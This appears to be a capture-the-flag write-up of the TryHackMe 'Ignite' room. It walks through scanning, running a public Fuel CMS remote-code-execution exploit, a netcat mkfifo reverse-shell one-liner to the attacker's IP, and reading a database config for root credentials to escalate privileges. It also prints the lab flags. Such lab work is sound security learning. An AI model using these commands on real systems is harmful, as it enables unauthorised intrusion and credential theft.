Hello everyone\! This is a beginner-friendly room from the TryHackMe platform titled “**Ignite**”

This room is classified as easy and is a walkthrough-type challenge. It took me around 20 minutes to complete, and I hope this write-up helps guide you through the process\!

My goal is to help you understand each step and provide clear explanations so that anyone, whether a beginner or experienced, can follow along and understand the reasoning behind each action. I hope this write-up makes the process smoother and easier to grasp.

Enough talk — let’s dive right in, and I hope you enjoy the journey\! :)

![][image3]

First, we deploy the machine. While it’s booting up, go ahead and open your terminal tab and get it ready.

Once it’s up, let’s copy the IP address and connect to the network. We encounter a Fuel CMS page.

![][image4]

I also initiate an Nmap scan and run a Feroxbuster scan.

![][image5]

***nmap 10.10.14.59 — open***

***![][image6]***

***feroxbuster \-u [http://10.10.14.59](http://10.10.14.59/) \-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt***

On the website, we also notice a **user ID and password mentioned** in the login section.

![][image7]

From the **Feroxbuster** results, we find the paths /fuel and /fuel/module

![][image8]

Next, Checking the version, we confirm it is **FuelCMS**, which has a known exploit for **Remote Code Execution (RCE)**.

![][image9]

Searching for an exploit in **ExploitDB** we see it :

![][image10]

Now back in the terminal I use **searchsploit:**

**![][image11]**

***searchsploit fuel cms***

We locate the exploit script:

![][image12]

***locate php/webapps/50477.py***

Copy it into our working directory and inspect it:

![][image13]

***cp /usr/share/exploitdb/exploits/php/webapps/50477.py .***  
***cat 50477.py***

We modify the script’s **target IP** (make sure it is the victim’s IP) and execute

![][image14]

***python3 50477.py \-u [http://10.10.14.59/](http://10.10.14.59/)***

Now once in, We confirm **RCE access** by running:

***whoami***  
***pwd***  
***ls \-la***

Now that we are in, I want to use the reverse shell now so I open the listner:

![][image15]

***nc \-lvnp 1234***

Now the **reverse shell payload:**

**![][image16]**

***rm \-f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh \-i 2\>&1|nc 10.4.1.240 1234 \>/tmp/f***

***{Replace 10.4.1.240 with our systemIP and 1234 with the port used in Netcat}***

Once the shell connects, we navigate through directories:

![][image17]

***cd /home***  
***ls \-la***  
***cd www-data***  
***ls \-la***  
***cat flag.txt***

That helps us retrieve the **user flag:**

6470e394cbf6dab6a91682cc8585059b

# **Privilege Escalation**

Looking at the **FuelCMS** structure, we check for **database configuration files**:

![][image18]

***cd /var/www/html/fuel/application/config/***  
***ls \-la***  
***cat database.php***

***$ cat database.php***

***\<?php***

***defined(‘BASEPATH’) OR exit(‘No direct script access allowed’);***

***\*/***

***$active\_group \= ‘default’;***

***$query\_builder \= TRUE;***

***$db\[‘default’\] \= array(***

***‘dsn’ \=\> ‘’,***

***‘hostname’ \=\> ‘localhost’,***

***‘username’ \=\> ‘root’,***

***‘password’ \=\> ‘mememe’,***

***‘database’ \=\> ‘fuel\_schema’,***

***‘dbdriver’ \=\> ‘mysqli’,***

***‘dbprefix’ \=\> ‘’,***

***‘pconnect’ \=\> FALSE,***

***‘db\_debug’ \=\> (ENVIRONMENT \!== ‘production’),***

***‘cache\_on’ \=\> FALSE,***

***‘cachedir’ \=\> ‘’,***

***‘stricton’ \=\> FALSE,***

***‘failover’ \=\> array(),***

***‘save\_queries’ \=\> TRUE***

***);***

***// used for testing purposes***

***if (defined(‘TESTING’))***

***{***

***@include(TESTER\_PATH.’config/tester\_database’.EXT);***

***}***

We find credentials:

* **Username**: root  
* **Password**: mememe

When we try su root, we get an error:

***su root***  
***su: must be run from a terminal***

To get around this, we spawn a **fully interactive TTY shell:**

***python \-c ‘import pty;pty.spawn(“/bin/bash”)’***

Now, we switch to root using the credentials found:

![][image19]

***su root***  
***mememe (password)***

***![][image20]***

***cd /root***  
***ls \-la***  
***cat root.txt***

b9bbcb33e11b80be759c4e844862482d
